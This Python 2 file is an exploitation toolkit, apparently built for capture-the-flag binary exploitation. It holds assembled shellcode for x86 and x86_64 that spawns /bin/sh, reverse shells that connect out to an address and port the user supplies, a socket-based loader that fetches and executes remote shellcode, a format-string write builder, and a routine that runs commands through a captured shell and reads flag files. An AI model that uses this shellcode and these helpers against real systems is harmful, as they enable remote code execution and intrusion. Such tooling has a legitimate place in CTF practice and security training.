import ctypes
import functools
import gzip
import hashlib
import itertools
import os
import random
import re
import select
import socket
import string
import struct
import subprocess
import sys
import telnetlib
import tempfile
import threading
import time
import base64
from sys import stdin, stdout, stderr, exit
from time import sleep

class Colors:
    HEADER = '\033[95m'
    BLACK = '\033[30m'
    YELLOW = '\033[33m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    CYAN = '\033[36m'
    MAGENTA = '\033[35m'
    RED = '\033[31m'
    BGBLUE = '\033[44m'
    BGGREEN = '\033[42m'
    BGCYAN = '\033[46m'
    BGMAGENTA = '\033[45m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def info(fmt, *args):
    fmt = fmt.replace('%p', '0x%016x')
    print Colors.BOLD + Colors.GREEN + '[*] ' + fmt % args + Colors.ENDC

DEBUG = False
LOCAL = False

HOST = None
PORT = None

if '--dbg' in sys.argv:
    sys.argv = [x for x in sys.argv if x != '--dbg']
    DEBUG = True
    info('Debug mode enabled')

if '--local' in sys.argv:
    sys.argv = [x for x in sys.argv if x != '--local']
    LOCAL = True
    HOST = 'localhost'
    PORT = 4444

if '--host' in sys.argv:
    idx = sys.argv.index('--host')
    HOST = sys.argv[idx+1]
    sys.argv = sys.argv[:idx] + sys.argv[idx+2:]

if '--port' in sys.argv:
    idx = sys.argv.index('--port')
    PORT = int(sys.argv[idx+1])
    sys.argv = sys.argv[:idx] + sys.argv[idx+2:]

LC = string.ascii_lowercase
UC = string.ascii_uppercase
DIG = "0123456789"
HEX = "0123456789abcdef"

def pack(x):
    if isinstance(x, (int,long)):
        return struct.pack("I", x)
    return x
def pack64(x):
    if isinstance(x, (int,long)):
        return struct.pack("Q", x)
    return x
def unpack(x):
    return struct.unpack("I", x)[0]
def unpack64(x):
    return struct.unpack("Q", x)[0]

def de_bruijn(k, n):
    a = [0] * k * n
    sequence = []
    def db(t, p):
        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    sequence.append(a[j])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return sequence

class Pattern:
    def __init__(self, n):
        alph = string.ascii_uppercase + string.ascii_lowercase + string.digits
        if n <= len(alph):
            self.s = alph[:n]
            return
        if n <= len(alph)**2:
            self.s = "".join(alph[i] for i in de_bruijn(len(alph), 2))[:n]
            return
        s = ""
        for a,b,c in itertools.product(
                string.ascii_uppercase,
                string.ascii_lowercase,
                string.digits):
            s += a + b + c
            if len(s) >= n:
                break
        assert len(s) >= n
        self.s = s[:n]
    def __str__(self):
        return self.s
    def offset(self, x):
        p = pack(x)
        i = self.s.index(p)
        try:
            self.s[i+len(p):].index(p)
        except ValueError:
            return i
        else:
            raise ValueError, "Not unique!"

def contains_not(x, bad):
    return not any(c in bad for c in x)

def contains_only(x, good):
    return all(c in good for c in x)

def tohex(s):
    return " ".join("%02x" % ord(c) for c in s)

def fromhex(s):
    return "".join(s.split()).decode("hex")

def nasm(code, bits=32):
    if isinstance(code, list):
        code = "\n".join(code)
    code = "BITS %d\n%s\n" % (bits, code)
    with tempfile.NamedTemporaryFile() as inp:
        inp.write(code)
        inp.flush()
        with tempfile.NamedTemporaryFile() as outp:
            fnameOut = outp.name
            p = subprocess.Popen(["nasm", "-o", outp.name, inp.name],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = p.communicate(code)
            if p.returncode:
                print err
                raise Exception("Assembly failed")
            return outp.read()

def yasm(code, bits=32):
    if isinstance(code, list):
        code = "\n".join(code)
    code = "BITS %d\n%%line 0 input\n%s\n" % (bits, code)
    with tempfile.NamedTemporaryFile() as outp:
        fnameOut = outp.name
        p = subprocess.Popen(["yasm", "-o", outp.name, "--", "-"],
                        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate(code)
        if p.returncode:
            print err
            raise Exception("Assembly failed")
        return outp.read()

def sh(s):
    return subprocess.check_output(['bash', '-c', s], stderr=subprocess.STDOUT)

def yasm_or_nasm(*args, **kw):
    try:
        sh('which yasm')
        return yasm(*args, **kw)
    except:
        return nasm(*args, **kw)

try:
    import capstone
    def capstone_dump(code, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32, cols="abm"):
        md = capstone.Cs(arch, mode)
        res = ""
        for i in md.disasm(code, 0x1000):
            line = ""
            if "a" in cols:
                line += "0x%04x: " % i.address
            if "b" in cols:
                line += "%-20s " % " ".join("%02x" % x for x in i.bytes)
            if "m" in cols:
                line += "%s %s" % (i.mnemonic, i.op_str)
            res += line + "\n"
        return res
except ImportError:
    pass

def xor_str(s, key):
    return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))

def xor_pair(s, bad='\0'):
    a = "\0"*len(s)
    while any(c in a or c in xor_str(a, s) for c in bad):
        a = "".join(chr(random.randrange(0x100)) for _ in s)
    return a, xor_str(a, s)


class x86:
    @staticmethod
    def assemble(code, **kw):
        return yasm_or_nasm(code, 32, **kw)
    @staticmethod
    def disas(code, **kw):
        return capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_32, **kw)


class x86_64:
    @staticmethod
    def assemble(code, **kw):
        return yasm_or_nasm(code, 64, **kw)
    @staticmethod
    def disas(code, **kw):
        return capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_64, **kw)


class x86_shellcode:
    # execve("/bin//sh", 0, 0), 21 bytes
    shell = x86.assemble("""
        xor ecx, ecx
        mul ecx
        push ecx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        mov al, 11
        int 0x80
        """)
    # dup2(ebx, 2); dup2(ebx, 1); dup2(ebx, 0)
    dup2_ebx = x86.assemble("""
        ; assume that socket fd is in ebx
        push 0x2
        pop ecx    ;set loop-counter
    ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
    duploop:
        mov al, 0x3f ;syscall: sys_dup2
        int 0x80         ;exec sys_dup2
        dec ecx             ;decrement loop-counter
        jns duploop         ;as long as SF is not set -> jmp to loop
        """)
    # ebx = dup(2) - 1
    dup_sock = x86.assemble("""
        push 2
        pop ebx
        push 0x29
        pop eax
        int 0x80
        dec eax
        mov ebx, eax
        """)
    shell_sock_reuse = dup_sock + dup2_ebx + shell
    # setreuid(geteuid(),geteuid())
    seteuid = x86.assemble("""
        ; geteuid
        xor eax, eax
        mov al, 0x31
        int 0x80

        ; setreuid
        mov ebx, eax
        mov ecx, eax
        xor eax, eax
        mov al, 0x46
        int 0x80
        """)
    setegid = x86.assemble("""
        ; getegid
        xor eax, eax
        mov al, 50
        int 0x80

        ; setregid
        mov ebx, eax
        mov ecx, eax
        xor eax, eax
        mov al, 71
        int 0x80
        """)
    shell_euid = seteuid + shell
    shell_egid = setegid + shell

    @staticmethod
    def shell_reverse(addr, port):
        addr = "0x" + "".join("%02x" % int(x) for x in reversed(addr.split(".")))
        port = "0x%02x%02x" % (port&0xff, port>>8)
        sc = x86.assemble("""
            ; socket
            push 0x66
            pop eax ;syscall: sys_socketcall + cleanup eax
            push 0x1
            pop ebx ;sys_socket (0x1) + cleanup ebx
            xor edx,edx ;cleanup edx
            push edx ;protocol=IPPROTO_IP (0x0)
            push ebx ;socket_type=SOCK_STREAM (0x1)
            push 0x2 ;socket_family=AF_INET (0x2)
            mov ecx, esp ;save pointer to socket() args
            int 0x80 ;exec sys_socket
            xchg edx, eax; save result (sockfd) for later usage
            ; connect
            mov al, 0x66
            push {addr}    ;sin_addr=127.1.1.1 (network byte order)
            push word {port} ;sin_port=1337 (network byte order)
            inc ebx
            push word bx         ;sin_family=AF_INET (0x2)
            mov ecx, esp         ;save pointer to sockaddr struct
            push 0x10 ;addrlen=16
            push ecx    ;pointer to sockaddr
            push edx    ;sockfd
            mov ecx, esp ;save pointer to sockaddr_in struct
            inc ebx ; sys_connect (0x3)
            int 0x80 ;exec sys_connect
            xchg ebx,edx ;save sockfd
            """.format(addr=addr, port=port))
        assert contains_not(sc, "\0")
        return sc + x86_shellcode.dup2_ebx + x86_shellcode.shell


class x86_64_shellcode:
    dup2_rdi = x86_64.assemble("""
        push 3
        pop rsi
    duploop:
        dec rsi
        push 0x21
        pop rax
        syscall
        jne duploop
        """)
    shell = x86_64.assemble("""
        xor rdi, rdi
        push rdi
        push rdi
        pop rsi
        pop rdx
        mov rdi, 0x68732f6e69622f2f
        shr rdi, 8
        push rdi
        push rsp
        pop rdi
        push 0x3b
        pop rax
        syscall
        """)
    @staticmethod
    def shell_reverse(addr, port, no_null=True):
        def p(x): return struct.pack("Q", x)
        def u(x): return struct.pack("Q", x)
        sockaddr = (
            "\x02\x00" +
            chr(port>>8) + chr(port&0xff) +
            "".join(chr(int(x)) for x in addr.split(".")))
        # this is to avoid nullbytes only
        if no_null:
            a, b = xor_pair(sockaddr, '\0')
        else:
            a = "\0"*8
            b = sockaddr
        a_q = struct.unpack("Q", a)[0]
        b_q = struct.unpack("Q", b)[0]
        sc = x86_64.assemble("""
            ; socket
            push 0x29
            pop rax
            cdq
            push 2
            pop rdi
            push 1
            pop rsi
            syscall
            ; connect
            xchg rax, rdi
            mov rcx, {b}
            """.format(b=b_q) +
            ("""
            mov rdx, {a}
            xor rcx, rdx
            """.format(a=a_q) if a != '\0'*8 else "") +
            """
            push rcx
            mov rsi, rsp
            push 0x10
            pop rdx
            push 0x2a
            pop rax
            syscall
            """)
        if no_null:
            assert contains_not(sc, "\0")
        return sc + x86_64_shellcode.dup2_rdi + x86_64_shellcode.shell

    @staticmethod
    def push_const(num, reg='rbx'):
        asm = ""
        if num == 0:
            asm += "xor {0}, {0}\npush {0}\n".format(reg)
        elif 0 <= num < (1<<7):
            asm += "push {0}\n".format(num)
        elif 0 <= num < (1<<32):
            a = struct.pack('>I', num)
            if '\0' in a:
                r = reg.replace('r', 'e')
                a, b = xor_pair(a)
                asm += "mov {0}, 0x{1}\n".format(r, a.encode("hex"))
                asm += "xor {0}, 0x{1}\n".format(r, b.encode("hex"))
                asm += "push {0}\n".format(reg)
            else:
                asm += "push 0x{0}\n".format(a.encode("hex"))
        elif 0 <= num < (1<<64):
            a, b = struct.pack('>Q', num), None
            if '\0' in a:
                a, b = xor_pair(a)
            asm += "mov {0}, 0x{1}\n".format(reg, a.encode("hex"))
            asm += "push {0}\n".format(reg)
            if b is not None:
                asm += "mov {0}, 0x{1}\n".format(reg, b.encode("hex"))
                asm += "xor [rsp], {0}".format(reg)
        else:
            raise Exception, "Don't support negative numbers yet"
        res = x86_64.assemble(asm)
        assert '\0' not in res
        return res

    @staticmethod
    def push_string(s, reg='rbx'):
        w = 8
        res = ""
        s += '\0'
        for i in reversed(range(0, len(s), w)):
            part = s[i:i+w].ljust(w, '\0')
            res += x86_64_shellcode.push_const(struct.unpack("<Q", part)[0], reg=reg)
        assert '\0' not in res
        return res

    @staticmethod
    def mkdir(dirname, mode=0755):
        a = x86_64.assemble
        res = "".join((
            x86_64_shellcode.push_string(dirname, reg='rax'),
            a('mov rdi, rsp'),
            x86_64_shellcode.push_const(mode, reg='rax'),
            a('''
                pop rsi
                push 83
                pop rax
                syscall
            ''')
        ))
        assert '\0' not in res
        return res

    @staticmethod
    def open(fname, flags=0, mode=0):
        a = x86_64.assemble
        res = "".join((
            x86_64_shellcode.push_string(fname, reg='rax'),
            a('mov rdi, rsp'),
            x86_64_shellcode.push_const(flags, reg='rax'),
            a('pop rsi'),
            x86_64_shellcode.push_const(mode, reg='rax'),
            a('''
                pop rdx
                push 2
                pop rax
                syscall
            ''')
        ))
        assert '\0' not in res
        return res

    @staticmethod
    def _read_write(fd, buf, sz, syscall):
        return "".join((
            x86_64_shellcode.push_const(fd, reg='rax'),
            a('pop rdi'),
            x86_64_shellcode.push_const(buf, reg='rax'),
            a('pop rsi'),
            x86_64_shellcode.push_const(sz, reg='rax'),
            a('''
                pop rdx
                push {0}
                pop rax
                syscall
            '''.format(syscall))
        ))

    @staticmethod
    def read(fd, buf, sz):
        return x86_64_shellcode._read_write(fd, buf, sz, 0)

    @staticmethod
    def _read_send_loop(buf_reg, sz_reg, fd=0, syscall=0):
        return """
        recvloop:
            test {sz_reg}, {sz_reg}
            jz recvloop_end
            mov rdi, {fd}
            mov rsi, {buf_reg}
            mov rdx, {sz_reg}
            mov rax, {syscall}
            syscall
            cmp rax, 0
            jge cont
            int3
        cont:
            add {buf_reg}, rax
            sub {sz_reg}, rax
            jmp recvloop
        recvloop_end:
            """.format(buf_reg=buf_reg, sz_reg=sz_reg, fd=fd, syscall=syscall)

    @staticmethod
    def loader(rwx_buf, fd=0):
        # TODO make a proper recvloop to account for segmentation
        return x86_64.assemble(("""
        start:
            mov rdi, {fd}
            pop rsi
            mov rsi, {buf}
            mov rdx, 8
            mov rax, 0   ; sys_read
            syscall

            mov r9, {buf}
            mov r10, [r9]
            """ +
            x86_64_shellcode._read_send_loop("r9", "r10", "{fd}", 0) +
            """
            mov rax, {buf}
            call rax
            jmp short start
            """).format(fd=fd, buf=rwx_buf))

for c in [x86_shellcode, x86_64_shellcode]:
    for k, sc in c.__dict__.items():
        if not k.startswith('_') and isinstance(sc, str):
            assert contains_not(sc, "\0")

class Remote_x86_64(object):
    """ Communicate with shellcode.loader """
    def __init__(self, sock, fd_in=0, fd_out=1):
        self.sock = sock
        self.fd_in = fd_in
        self.fd_out = fd_out

    def execute(self, sc):
        sc += x86_64.assemble("ret")
        self.sock.sendall(struct.pack("Q", len(sc)) + sc)

    def read(self, addr, sz):
        self.execute(x86_64.assemble("""
            mov r9, {addr}
            mov r10, {sz}
            """.format(addr=addr, sz=sz) +
            x86_64_shellcode._read_send_loop("r9", "r10", self.fd_out, 1)
            ))
        return readn(self.sock, sz, debug=False)

    def read_str(self, addr):
        res = ""
        while True:
            c = self.read(addr, 1)
            if c == '\0':
                return res
            res += c
            addr += 1

    def read_struct(self, addr, fmt):
        return struct.unpack(fmt, self.read(addr, struct.calcsize(fmt)))

    def read4(self, addr):
        return self.read_struct(addr, "I")[0]

    def read8(self, addr):
        return self.read_struct(addr, "Q")[0]

    def write(self, addr, data):
        self.execute(x86_64.assemble("""
            mov r9, {addr}
            mov r10, {sz}
            """.format(addr=addr, sz=len(data)) +
            x86_64_shellcode._read_send_loop("r9", "r10", self.fd_in, 0)
            ))
        self.sock.sendall(data)

try:
    libc = ctypes.CDLL("libc.so.6")
except:
    pass

def alloc_exec_buffer(buf):
    sz = len(buf)
    buf = ctypes.c_char_p(buf)
    addr = ctypes.c_void_p(libc.valloc(sz))
    if 0 == addr:
        raise Exception("valloc failed")
    libc.memmove(addr, buf, sz)
    if 0 != libc.mprotect(addr, sz, 7):
        raise Exception("mprotect failed")
    return addr

def execute_code(sc):
    ctypes.cast(alloc_exec_buffer(sc), ctypes.CFUNCTYPE(None))()

def execvp(fname, args):
    for x in args:
        assert contains_not(x, "\0")
    Args = ctypes.c_char_p * (len(args)+1)
    libc.execvp(fname, Args(*(args + [0])))

def execvpe(fname, args, env):
    for x in args:
        assert contains_not(x, "\0")
    for x in env:
        assert contains_not(x, "\0")
    Args = ctypes.c_char_p * (len(args)+1)
    Env = ctypes.c_char_p * (len(env)+1)
    libc.execvpe(fname, Args(*(args + [0])), Env(*(env + [0])))

def pipe(cmd, inp=""):
    return (subprocess.Popen(cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE)
        .communicate(inp)[0])

def instrument(cmd, args, env):
    stdin_read, stdin_write = os.pipe()
    stdout_read, stdout_write = os.pipe()
    pid = os.fork()
    if pid == 0:
        # child
        os.dup2(stdin_read, 0)
        os.dup2(stdout_write, 1)
        execvpe(cmd, args, env)
    return (os.fdopen(stdin_write, "w"),
                    os.fdopen(stdout_read, "r"),
                    lambda: os.waitpid(pid, 0))

def can_read(s, timeout=0):
    x,_,_ = select.select([s], [], [], timeout)
    return x != []

def wait_for_socket(s, timeout=1):
    return can_read(s, timeout)

THE_TARGET = None
THE_SOCKET = None

def connect(host=None, port=None):
    if host is None or HOST is not None: host = HOST
    if port is None or PORT is not None: port = PORT
    global THE_TARGET, THE_SOCKET
    info('Connecting to %s:%d' % (host, port))
    s = socket.create_connection((host, port))
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    THE_TARGET = (host, port)
    THE_SOCKET = s
    return s

def reconnect():
    assert THE_TARGET is not None
    try:
        THE_SOCKET.close()
    except:
        pass
    connect(*THE_TARGET)

ESCAPES = {'\r': r'\r', '\n': '\\n\n', '\t': r'\t'}

def format_char(c, fg, bg):
    if 0x20 <= ord(c) <= 0x7e:
        return fg + c + Colors.ENDC
    elif c == '\n':
        return bg + r'\n' + Colors.ENDC + '\n'
    elif c in ESCAPES:
        return bg + ESCAPES[c] + Colors.ENDC
    else:
        return bg + '{:02x}'.format(ord(c)) + Colors.ENDC

def debug_io(data, out):
    if out:
        fg, bg = Colors.MAGENTA, Colors.BGMAGENTA
    else:
        fg, bg = Colors.BLUE, Colors.BGBLUE
    for c in data:
        sys.stdout.write(format_char(c, fg, bg))
    sys.stdout.flush()

def debug_io_end(data, out):
    if data.endswith('\n'):
        return
    if out:
        bg = Colors.BGMAGENTA
    else:
        bg = Colors.BGBLUE
    sys.stdout.write(bg + '%' + Colors.ENDC + '\n')
    sys.stdout.flush()

def read_all(*args, **kw):
    debug = kw.get('debug', True) and DEBUG
    timeout = kw.get('timeout', 0.2)
    if len(args) == 0:
        s = THE_SOCKET
    else:
        s, = args

    if debug:
        print Colors.YELLOW + '[*] Reading as much data as there is...' + Colors.ENDC
    buf = ''
    while can_read(s, timeout=timeout):
        part = s.recv(1024)
        if debug: debug_io(part, out=False)
        assert part
        buf += part
    if debug: debug_io_end(buf, out=False)
    return buf

def readn(*args, **kw):
    debug = kw.get('debug', True) and DEBUG

    if len(args) == 1:
        s = THE_SOCKET
        sz, = args
    else:
        s, sz = args

    if debug:
        print Colors.YELLOW + '[*] Reading %d bytes...' % sz + Colors.ENDC
    buf = ""
    while len(buf) < sz:
        part = s.recv(sz - len(buf))
        assert part
        if debug: debug_io(part, out=False)
        buf += part
    if debug: debug_io_end(buf, out=False)
    return buf

def read_until(*args, **kw):
    debug = kw.get('debug', True) and DEBUG

    if len(args) == 1:
        s = THE_SOCKET
        f, = args
    else:
        s, f = args

    if not callable(f):
        if debug:
            print Colors.YELLOW + '[*] Waiting for %r...' % f + Colors.ENDC
        f = lambda x, st=f: st in x

    buf = ""
    if debug:
        while not f(buf):
            d = s.recv(1)
            assert d
            if debug: debug_io(d, out=False)
            buf += d
    else:
        while not f(buf):
            d = s.recv(1)
            assert d
            buf += d
    if debug: debug_io_end(buf, out=False)
    return buf

def readln(*args, **kw):
    if len(args) == 0:
        s = THE_SOCKET
    else:
        s, = args
    return read_until(s, '\n')[:-1]

def read_until_match(*args, **kw):
    if len(args) == 1:
        s = THE_SOCKET
        regex, = args
    else:
        s, regex = args
    return re.match(regex, read_until(s, lambda x: re.match(regex, x), **kw)).groups()

def send(*args, **kw):
    debug = kw.get('debug', True) and DEBUG

    if len(args) == 1:
        s = THE_SOCKET
        st, = args
    else:
        s, st = args

    debug &= DEBUG
    if debug:
        debug_io(st, out=True)
        debug_io_end(st, out=True)
    st = str(st)
    s.sendall(st)

def sendln(*args, **kw):
    if len(args) == 1:
        s = THE_SOCKET
        st, = args
    else:
        s, st = args
    st = str(st)
    send(s, st + '\n', **kw)

def pause():
    info('Press ENTER to continue')
    raw_input()

def interact(s=None):
    if s is None: s = THE_SOCKET
    # from https://github.com/saelo/ctfcode/blob/master/pwn.py
    try:
        while True:
            available, _, _ = select.select([0, s], [], [])
            for src in available:
                if src == 0:
                    # Only one read() call, otherwise this breaks when the tty is in raw mode
                    data = os.read(0, 1024)
                    s.sendall(data)
                else:
                    data = s.recv(4096)
                    if not data:
                        print('*** Server disconnected ***')
                        return
                    sys.stdout.write(data)
                    sys.stdout.flush()
    except KeyboardInterrupt:
        return

def enjoy(s=None, timeout=0.5):
    if s is None: s = THE_SOCKET
    while True:
        sendln(s, 'echo __SHELLMARKER__', debug=False)
        buf = ''
        if '__SHELLMARKER__' in read_all(s, timeout=timeout, debug=False):
            break
    read_all(s, debug=False, timeout=timeout)

    info('Some info you might enjoy:')
    s.sendall('id;uname -a\n')
    s.sendall('echo -n "cwd : ";for file in $(ls); do echo -n "$file "; done; echo\n')
    s.sendall('echo -n "/   : ";for file in $(ls /); do echo -n "$file "; done; echo\n')
    s.sendall('(bash -c "cat {/,./}{flag,FLAG,Flag}{,.txt}") 2>/dev/null\n')
    print Colors.RED + read_all(s, debug=False, timeout=timeout) + Colors.ENDC
    info('And finally what we all came here for:')
    sys.stdout.write(Colors.BOLD + Colors.RED + '$ ' + Colors.ENDC)
    sys.stdout.flush()
    interact(s)

def gzip_compress(s):
    with tempfile.NamedTemporaryFile() as f:
        with gzip.open(f.name, 'wb') as g:
            g.write(s)
            g.close()
        return f.read()

def copy_to_clipboard(s):
    selections = [
        #'-ibp',
        '-i'
    ]
    for sel in selections:
        p = subprocess.Popen(['xsel', sel], stdin=subprocess.PIPE)
        p.stdin.write(s)
        p.stdin.close()
        p.wait()

def sha1(s):
    return hashlib.sha1(s).hexdigest()

def sha256(s):
    return hashlib.sha256(s).hexdigest()

def md5(s):
    return hashlib.md5(s).hexdigest()

def make_format(addr, val, offset, dbg=False, bits=64):
    """
    Builds a format string for a word write.
    You have to place addrstr such that %<offset>$p prints addr.
    """
    assert bits == 64
    vals = sorted(zip(struct.unpack("HHHH", struct.pack("Q", val)), (0,1,2,3)))
    fmt = addrstr = ""
    for i in range(len(vals)):
        diff = vals[i][0] - (vals[i-1][0] if i > 0 else 0)
        pos = vals[i][1]
        assert 0 <= diff < 0x10000
        if dbg:
            fmt += "+{} %{}$p ".format(diff, offset+pos)
        else:
            if diff:
                fmt += "%{}c".format(diff)
            fmt += "%{}$hn".format(offset+pos)
        addrstr += struct.pack("Q", addr+2*i)
    return fmt, addrstr, vals[-1][0]

# aliases
ru = read_until

p32 = pack
u32 = unpack

p64 = pack64
u64 = unpack64
